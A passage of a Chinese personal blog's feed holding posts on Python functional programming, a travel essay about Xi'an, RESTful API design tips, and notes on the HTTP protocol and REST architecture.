    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;convert_to_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The Number: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;nums&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;fns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;even_filter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;multiply_by_three&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;convert_to_string&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;pipeline_func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fns&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                  &lt;span class="n"&gt;fns&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                  &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#reduce有两个列表时怎么处理？&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;高阶函数&lt;/h3&gt;
&lt;p&gt;python中，高阶函数常常写作装饰器(Decorator)，可以参考之前的一篇&lt;a href="http://wwj718.github.io/learning-python-decorator.html"&gt;文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如陈浩在博客中说的：我们不用太纠结是不是我们的程序就是OO，就是functional的，我们重要的品味其中的味道&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;具体的使用 map filter groupby sorted (信息隐藏，对外True/False) &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kachayev/fn.py"&gt;fn.py&lt;/a&gt; Functional programming in Python&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JulienPalard/Pipe"&gt;Pipe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cyberdelia/django-pipeline"&gt;django-pipeline&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kvalle/diy-lisp"&gt;diy-lisp&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://coolshell.cn/articles/10822.html"&gt;函数式编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://coolshell.cn/articles/11265.html"&gt;Python修饰器的函数式编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2012/04/functional_programming.html"&gt;函数式编程初探&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-03:python-functional.html</guid><category>python</category></item><item><title>西安纪游</title><link>/xian.html</link><description>&lt;p&gt;抱歉，坑了你，我写着写着把攻略写成游记了囧&lt;/p&gt;
&lt;h2&gt;1&lt;/h2&gt;
&lt;p&gt;我是四月份去的，农历正值阳春三月。&lt;/p&gt;
&lt;p&gt;傍晚的火车。&lt;/p&gt;
&lt;p&gt;我来恰是夕阳时。&lt;/p&gt;
&lt;p&gt;当时签名是这样写的，就是这么傲娇。。&lt;/p&gt;
&lt;p&gt;去的时候期望不大，无非走走看看，趁着闲暇，毕竟没往西边走过。&lt;/p&gt;
&lt;p&gt;怕行程无聊，背包里还丢两本书&lt;/p&gt;
&lt;p&gt;事实证明，我是想多了&lt;/p&gt;
&lt;h2&gt;2&lt;/h2&gt;
&lt;p&gt;在火车上意淫即将到达的长安。西风残照，汉家陵阙&lt;/p&gt;
&lt;p&gt;想象我背着行囊，骑着毛驴，问路过的牧童，酒家何处有，好心的孩子没有把我带到黑店，我落脚客栈，因为缺水，大约要三天不洗澡吧。&lt;/p&gt;
&lt;p&gt;到了晚饭时间，拍拍桌上的尘土，喊道，小二，切三斤牛肉，再来两斤白酒。&lt;/p&gt;
&lt;p&gt;对面的桌子上，坐着镖局的人，带头的老江湖脸上还有刀疤。这时候晚风萧瑟，烛影摇晃，风雨欲来的话，气氛就更好了。&lt;/p&gt;
&lt;p&gt;我呢，落拓青衫，骨骼清奇，劫富济贫，浪荡不羁的少年剑客，你们还有什么褒义词请随白菜鸡蛋向我砸来&lt;/p&gt;
&lt;p&gt;天色渐暗，我带着斗箕，低着头，吃着酒，听着老江湖们吃酒吹牛。面目狰狞的镖头解刀疤示人说，老子当年差点没被xxx砍死，得意洋洋，中间省略若干斗智斗勇的桥段。&lt;/p&gt;
&lt;p&gt;我一副落魄书生的样子，还在低头吃酒，没人知道我的腰间渊虹，袋里黄金。&lt;/p&gt;
&lt;p&gt;如你所料，我准备劫下这趟镖。&lt;/p&gt;
&lt;p&gt;你看我连段落风格都模仿古龙了。还不打架像话么。&lt;/p&gt;
&lt;p&gt;事成之后，要不是字太丑，都准备好了在结了蛛网的墙壁上写下  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;曾因酒醉鞭名马，生怕情多累美人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当然是用剑写，不然我会用中华绘图２B铅笔么。&lt;/p&gt;
&lt;p&gt;至于落款，我也想好了，wwj到此一游。土是土了点&lt;/p&gt;
&lt;h2&gt;3&lt;/h2&gt;
&lt;p&gt;在迷迷糊糊的yy中，火车到站了。&lt;/p&gt;
&lt;p&gt;都还没yy到英雄救美的情节。&lt;/p&gt;
&lt;p&gt;时间尚早，跟H说大约８点到车站等我就行，却7点多些就到了。&lt;/p&gt;
&lt;p&gt;下车，在周边闲逛，想等小伙伴一起吃早餐，没打通电话。只好自己先去肯德基填饱肚子。&lt;/p&gt;
&lt;h2&gt;4&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;抵达的时候阳光正好，听风吹得暖软&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果小楼也去过长安的话，应该是在春季吧&lt;/p&gt;
&lt;p&gt;长安不是我想象中的样子,就像不是小楼想象中的样子，我倒是没有失望，反倒是满心欢喜。&lt;/p&gt;
&lt;p&gt;这个给我第一眼印象有些古朴，有些安静，有些落落大方的城市，没有落日孤烟，也没有大漠黄沙，相反，路边的广场上喷泉倒是不少，看来并不缺水，我不需要三天不洗澡。这里比我见过的绝大多数北方城市都漂亮。甚至有些柔和。&lt;/p&gt;
&lt;h2&gt;5&lt;/h2&gt;
&lt;p&gt;满目玲琅的长安.&lt;/p&gt;
&lt;p&gt;你猜到了，我说的就是回民街，对于我们吃货(我只是业余的！)，当我们说起满目玲琅的时候，说的自然是食物，当我们说起秀色可餐的时候，说的还是食物&lt;/p&gt;
&lt;h2&gt;6&lt;/h2&gt;
&lt;p&gt;你看，人家逛长安，都文艺得很，诗意如“秋风吹渭水，落叶满长安”，落寞如“同心一人去，坐觉长安空”.&lt;/p&gt;
&lt;p&gt;再不济“美人如花隔云端”也好啊，垂涎一下美色，好歹落得个风流倜傥，或是青楼薄幸名。而我们，有着远大抱负的2B文艺青年，一个劲地往回民街跑，真有些丢人。&lt;/p&gt;
&lt;p&gt;到时候回去只好感叹，“徒增岁月在腰肢”&lt;/p&gt;
&lt;h2&gt;7&lt;/h2&gt;
&lt;p&gt;陕博（陕西博物馆）据说是不错的，可惜我去的不是时候，很拥挤，又不愿排队，只好作罢。&lt;/p&gt;
&lt;p&gt;小伙伴说附近有家书店不错，就去逛了逛，叫关中大书房，店内十分安静，二楼复古之极，似乎是民国时期的装扮，灯光幽暗，有笔墨纸砚，陈年旧书，以及五年之后寄给自己的明信片。可以将自己写好的的明信片，搁在这里，会被定时寄出，看到厚厚的一摞，字迹潦草或是清秀。&lt;/p&gt;
&lt;h2&gt;8&lt;/h2&gt;
&lt;p&gt;从回民街带了点零食，就跟小伙伴往城墙去了。时近傍晚，晚风拂发，落日徐徐，人影参差。&lt;/p&gt;
&lt;p&gt;发呆也好，闲聊也好，骑车也好，沉默也好。&lt;/p&gt;
&lt;p&gt;夜色来临，晚风有点大了，四月的温度还有点凉，披上外套，继续闲聊或者发呆，城墙上人渐少，灯笼亮起，我很喜欢这种气氛，城中灯火通明的时候，城墙附近一片，却是灯火零星（可能是景区），挺有意境。&lt;/p&gt;
&lt;p&gt;古时候在城墙上守夜的人们，看着渐入睡梦的城池，大约会有些自豪与落寞吧。为城中的祥和也为自己不能老婆孩子热炕头。如果是下着大雪的年夜，大约心里是很不好受的&lt;/p&gt;
&lt;h2&gt;8&lt;/h2&gt;
&lt;p&gt;兵马俑在临潼，离西安市区有段车程，我本来是不打算去兵马俑的，一直对这种权利的象征毫无兴趣。&lt;/p&gt;
&lt;p&gt;逛完华清池，一看时间还早，人家说下一站就是兵马俑，就顺路去了，来都来了。。对华清池的兴趣，是想到杜牧的:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一骑红尘妃子笑，无人知是荔枝来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对我而言，历史如果还有一丝趣味的话，是因为历史上存在着才子佳人们，这些有趣优雅的灵魂&lt;/p&gt;
&lt;p&gt;一将功成万骨枯，帝王事业就更是如此了，这是我逛秦陵和兵马俑的感觉。&lt;/p&gt;
&lt;p&gt;拿破仑说，世上只有两种力量：利剑和思想。从长远看，利剑总是败给思想。&lt;/p&gt;
&lt;h2&gt;9&lt;/h2&gt;
&lt;p&gt;至于西交大樱花，大雁塔的音乐喷泉都是很不错的&lt;/p&gt;
&lt;h2&gt;10&lt;/h2&gt;
&lt;p&gt;跑完步，洗完澡回来，想起一段插曲，补上。&lt;/p&gt;
&lt;p&gt;到达临潼景区的时候，已经过了饭点。进了家餐厅，点完主食，准备点份汤的时候，发现口味都挺重的，舟车劳顿，胃口不好，想吃清淡一些的。&lt;/p&gt;
&lt;p&gt;于是跟老板说，汤里不加这些东西，老板问，那加什么。&lt;/p&gt;
&lt;p&gt;想说什么都不加，结果说成&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我就要一碗纯粹的汤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;嗯，就是这么高冷的词汇，老板与我对视良久。。&lt;/p&gt;
&lt;p&gt;你说后来啊，后来，我要了份饮料&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-03:xian.html</guid><category>随笔</category></item><item><title>RESTful Api设计</title><link>/RESTful-Api.html</link><description>&lt;h1&gt;拆分资源&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;”资源“应该是个名词&lt;/li&gt;
&lt;li&gt;内部数据模型和资源对应起来&lt;/li&gt;
&lt;li&gt;不需要把它们一对一的都暴露出来。隐藏内部资源，暴露必需的外部资源。&lt;/li&gt;
&lt;li&gt;一旦定义好了要暴露的资源，你可以定义资源上允许的操作&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;GET /blog # 获取blog列表
GET /blog/12 # 查看某个具体的blog
POST /blog # 新建一个blog
PUT /blog/12 # 更新blog 12.
DELETE /blog/12 #删除blog 12
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;REST的好处在于可以充分利用http的强大实现对资源的CURD功能。而这里你只需要一个endpoint：/blog,再没有其他什么命名规则和url规则了&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;处理关联&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;GET /tickets/12/messages- Retrieves list of messages for ticket #12
GET /tickets/12/messages/5- Retrieves message #5 for ticket #12
POST /tickets/12/messages- Creates a new message in ticket #12
PUT /tickets/12/messages/5- Updates message #5 for ticket #12
PATCH /tickets/12/messages/5- Partially updates message #5 for ticket #12
DELETE /tickets/12/messages/5- Deletes message #5 for ticket #12
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果这种关联和资源独立，那么我们可以在资源的输出表示中保存相应资源的endpoint。然后API的使用者就可以通过点击链接找到相关的资源。如果关联和资源联系紧密。资源的输出表示就应该直接保存相应资源信息&lt;/p&gt;
&lt;h1&gt;使用SSL&lt;/h1&gt;
&lt;p&gt;使用SSL可以减少鉴权的成本：你只需要一个简单的令牌（token）就可以鉴权了，而不是每次让用户对每次请求签名。&lt;/p&gt;
&lt;h1&gt;文档&lt;/h1&gt;
&lt;p&gt;文档应该有展示请求和输出的例子：或者以点击链接的方式或者通过curl的方式&lt;br /&gt;
文档中应该有关于何时弃用某个API的时间表以及详情&lt;/p&gt;
&lt;h1&gt;结果过滤，排序，搜索&lt;/h1&gt;
&lt;p&gt;url最好越简短越好，和结果过滤，排序，搜索相关的功能都应该通过参数实现&lt;/p&gt;
&lt;p&gt;get /tickekts state=open&lt;/p&gt;
&lt;h1&gt;限制API返回值的域&lt;/h1&gt;
&lt;p&gt;使用fields查询参数来限制返回的域例如：&lt;/p&gt;
&lt;p&gt;GET /tickets fields=id,subject,customer_name,updated_at&amp;amp;state=open&amp;amp;sort=-updated_at&lt;/p&gt;
&lt;h1&gt;只提供json作为返回格式&lt;/h1&gt;
&lt;p&gt;好读好用，逆袭xml成功&lt;/p&gt;
&lt;h1&gt;API的输入数据格式&lt;/h1&gt;
&lt;p&gt;使用json&lt;br /&gt;
很多的API使用url编码格式：就像是url查询参数的格式一样：单纯的键值对。这种方法简单有效，但是也有自己的问题：它没有数据类型的概念。这使得程序不得不根据字符串解析出布尔和整数,而且还没有层次结构。&lt;br /&gt;
如果API本身就很简单，那么使用url格式的输入没什么问题。但对于复杂的API你应该使用json。或者干脆统一使用json。&lt;br /&gt;
注意使用json传输的时候，要求请求头里面加入：Content-Type：application/json&lt;/p&gt;
&lt;h1&gt;分页&lt;/h1&gt;
&lt;p&gt;推荐将分页信息放到link header里面：&lt;br /&gt;
http://tools.ietf.org/html/rfc5988#page-6。&lt;/p&gt;
&lt;h1&gt;鉴权 Authentication&lt;/h1&gt;
&lt;p&gt;restful API是无状态的也就是说用户请求的鉴权和cookie以及session无关，每一次请求都应该包含鉴权证明。&lt;br /&gt;
通过使用ssl，可以不用每次都提供用户名和密码：我们可以给用户返回一个随机产生的token。这样可以极大的方便使用浏览器访问API的用户。这种方法适用于用户可以首先通过一次用户名-密码的验证并得到token，并且可以拷贝返回的token到以后的请求中。如果不方便，可以使用OAuth 2来进行token的安全传输。&lt;/p&gt;
&lt;h1&gt;缓存&lt;/h1&gt;
&lt;p&gt;HTTP提供了自带的缓存框架。你需要做的是在返回的时候加入一些返回头信息&lt;/p&gt;
&lt;h1&gt;出错处理&lt;/h1&gt;
&lt;p&gt;就像html错误页面能够显示错误信息一样，API 也应该能返回可读的错误信息–它应该和一般的资源格式一致。&lt;br /&gt;
API应该始终返回相应的状态码，以反映服务器或者请求的状态。&lt;br /&gt;
API的错误码可以分为两部分，400系列和500系列，400系列表明客户端错误：如错误的请求格式等。500系列表示服务器错误。以json形式返回。错误应该包含以下信息：一个有用的错误信息，一个唯一的错误码，以及任何可能的详细错误描述。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{
  &amp;quot;code&amp;quot; : 1234,
  &amp;quot;message&amp;quot; : &amp;quot;Something bad happened :-(&amp;quot;,
  &amp;quot;description&amp;quot; : &amp;quot;More details about the error here&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;附录：HTTP 状态码&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; 200 ok  - 成功返回状态，对应，GET,PUT,PATCH,DELETE.
 201 created  - 成功创建。
 304 not modified   - HTTP缓存有效。
 400 bad request   - 请求格式错误。
 401 unauthorized   - 未授权。
 403 forbidden   - 鉴权成功，但是该用户没有权限。
 404 not found - 请求的资源不存在
 405 method not allowed - 该http方法不被允许。
 410 gone - 这个url对应的资源现在不可用。
 415 unsupported media type - 请求类型错误。
 422 unprocessable entity - 校验错误时用。
 429 too many request - 请求过多。
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;示例&lt;/h1&gt;
&lt;p&gt;github的api设计得非常好&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/41233/"&gt;RESTful API 设计最佳实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 28 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-28:RESTful-Api.html</guid><category>RESTful</category></item><item><title>HTTP相关</title><link>/about-HTTP.html</link><description>&lt;h1&gt;HTTP协议&lt;/h1&gt;
&lt;p&gt;（参考维基百科）  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;超文本传输协议（英文：HyperText Transfer Protocol，缩写：HTTP）是互联网上应用最为广泛的一种网络协议&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;协议概述&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;HTTP是一个客户端终端（用户）和服务器端（网站）请求和应答的标准&lt;/li&gt;
&lt;li&gt;通过使用Web浏览器、网络爬虫或者其它的工具，客户端发起一个HTTP请求到服务器上指定端口。在用户代理和源服务器中间可能存在多个“中间层”，比如代理、网关或者隧道。&lt;/li&gt;
&lt;li&gt;HTTP假定其下层协议提供可靠的传输&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;请求应答过程&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;由HTTP客户端发起一个请求，创建一个到服务器指定端口（默认是80端口）的TCP连接。&lt;/li&gt;
&lt;li&gt;HTTP服务器则在那个端口监听客户端的请求。&lt;/li&gt;
&lt;li&gt;一旦收到请求，服务器会向客户端返回一个状态，比如"HTTP/1.1 200 OK"，以及返回的内容，如请求的文件、错误消息等&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;请求信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;请求行&lt;/li&gt;
&lt;li&gt;例如GET /images/logo.gif HTTP/1.1，表示从/images目录下请求logo.gif这个文件。&lt;/li&gt;
&lt;li&gt;（请求）头，&lt;/li&gt;
&lt;li&gt;例如Accept-Language: en&lt;/li&gt;
&lt;li&gt;空行&lt;/li&gt;
&lt;li&gt;其他消息体&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;请求行和标题必须以&lt;CR&gt;&lt;LF&gt;作为结尾。空行内必须只有&lt;CR&gt;&lt;LF&gt;而无其他空格。在HTTP/1.1协议中，所有的请求头，除Host外，都是可选的。&lt;/p&gt;
&lt;h2&gt;请求方法&lt;/h2&gt;
&lt;p&gt;HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OPTIONS：这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用'*'来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。&lt;/li&gt;
&lt;li&gt;HEAD：与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部份。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。&lt;/li&gt;
&lt;li&gt;GET：向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。参见安全方法&lt;/li&gt;
&lt;li&gt;POST：向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。&lt;/li&gt;
&lt;li&gt;PUT：向指定资源位置上传其最新内容。&lt;/li&gt;
&lt;li&gt;DELETE：请求服务器删除Request-URI所标识的资源。&lt;/li&gt;
&lt;li&gt;TRACE：回显服务器收到的请求，主要用于测试或诊断。&lt;/li&gt;
&lt;li&gt;CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。&lt;/li&gt;
&lt;li&gt;此外  PATCH（由RFC5789指定的方法）:用于将局部修改应用到资源。
方法名称是区分大小写  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Method Not Allowed），当服务器不认识或者不支持对应的请求方法的时候，应当返回状态码501（Not Implemented）。&lt;/p&gt;
&lt;p&gt;HTTP服务器至少应该实现GET和HEAD方法  &lt;/p&gt;
&lt;h3&gt;安全方法&lt;/h3&gt;
&lt;p&gt;对于GET和HEAD方法而言，除了进行获取资源信息外，这些请求不应当再有其他意义。&lt;/p&gt;
&lt;h3&gt;副作用&lt;/h3&gt;
&lt;p&gt;若干次请求的副作用与单次请求相同，那么这些请求方法就能够被视作“幂等”的。GET，HEAD，PUT和DELETE方法都有这样的幂等属性，同样由于根据协议，OPTIONS，TRACE也是幂等的。&lt;/p&gt;
&lt;h3&gt;状态码&lt;/h3&gt;
&lt;p&gt;所有HTTP响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1xx消息——请求已被服务器接收，继续处理&lt;/li&gt;
&lt;li&gt;2xx成功——请求已成功被服务器接收、理解、并接受&lt;/li&gt;
&lt;li&gt;3xx重定向——需要后续操作才能完成这一请求&lt;/li&gt;
&lt;li&gt;4xx请求错误——请求含有词法错误或者无法被执行&lt;/li&gt;
&lt;li&gt;5xx服务器错误——服务器在处理某个正确请求时发生错误&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;协议例子&lt;/h3&gt;
&lt;p&gt;下面是一个HTTP客户端与服务器之间会话的例子，运行于www.google.com，端口80&lt;/p&gt;
&lt;h4&gt;客户端请求：&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;GET / HTTP/1.1
Host:www.google.com
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;（末尾有一个空行。第一行指定方法、资源路径、协议版本；第二行是在1.1版里必带的一个header作用指定主机）&lt;/p&gt;
&lt;h4&gt;服务器应答：&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HTTP/1.1 200 OK
Content-Length: 3059
Server: GWS/2.0
Date: Sat, 11 Jan 2003 02:44:04 GMT
Content-Type: text/html
Cache-control: private
Set-Cookie: PREF=ID=73d4aef52e57bae9:TM=1042253044:LM=1042253044:S=SMCc_HRPCQiqy
X9j; expires=Sun, 17-Jan-2038 19:14:07 GMT; path=/; domain=.google.com
Connection: keep-alive
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;（紧跟着一个空行，并且由HTML格式的文本组成了Google的主页）&lt;/p&gt;
&lt;h2&gt;中文译名问题&lt;/h2&gt;
&lt;p&gt;HTTP在中国大陆被翻译为“超文本传输协议”&lt;br /&gt;
“transfer”表达的是“（表述状态的）转移”（Representational State Transfer）&lt;/p&gt;
&lt;h1&gt;调试/测试&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kennethreitz/httpbin"&gt;httpbin&lt;/a&gt;  替代curl&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cn.python-requests.org/zh_CN/latest/"&gt;requests&lt;/a&gt;  python处理http&lt;/li&gt;
&lt;li&gt;使用chrome自带调试工具(F12)&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 28 Aug 2014 00:00:00 +0000</pubDate><guid>tag:,2014-08-28:about-HTTP.html</guid><category>web</category></item><item><title>理解RESTful架构</title><link>/about-RESTful.html</link><description>&lt;p&gt;关于这个话题，读过最好的中文资料是阮一峰老师博客上的&lt;a href="http://www.ruanyifeng.com/blog/2011/09/restful.html"&gt;这篇文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以下做些摘录，方便自己查看，想理解RESTful架构架构，建议翻阅上头的文章。&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;解决什么问题&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;网站即软件&lt;/li&gt;
&lt;li&gt;这种"互联网软件"具有高延时（high latency）、高并发等特点。&lt;/li&gt;
&lt;li&gt;RESTful架构，就是目前最流行的一种互联网软件架构&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;顾名思义&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;REST，即&lt;code&gt;Representational State Transfer&lt;/code&gt;的缩写。阮一峰老师对这个词组的翻译是&lt;code&gt;表现层状态转化&lt;/code&gt;。如果一个架构符合REST原则，就称它为RESTful架构。&lt;/li&gt;
&lt;li&gt;要理解RESTful架构，最好的方法就是去理解Representational State Transfer这个词组到底是什么意思，它的每一个词代表了什么涵义。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;逐词分析&lt;/h1&gt;
&lt;h2&gt;资源（Resources）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;REST的名称"表现层状态转化"中，省略了主语。"表现层"其实指的是"资源"（Resources）的"表现层"。&lt;/li&gt;
&lt;li&gt;所谓"资源"，就是网络上的一个实体，或者说是网络上的一个具体信息。&lt;/li&gt;
&lt;li&gt;"资源"是具体的实在。你可以用一个URI（统一资源定位符）指向它&lt;/li&gt;
&lt;li&gt;注：uri是定位关键，在后端视角来看（django-restful-framework），框架要把资源（数据)映射到uri（url）上&lt;/li&gt;
&lt;li&gt;注2：资源可能是分布式的，使用超链接来连接它们&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;表现层（Representation）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;"资源"是一种信息实体，它可以有多种外在表现形式。我们把"资源"具体呈现出来的形式，叫做它的"表现层"（Representation）。&lt;/li&gt;
&lt;li&gt;而URI应该只代表"资源"的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对"表现层"的描述。&lt;/li&gt;
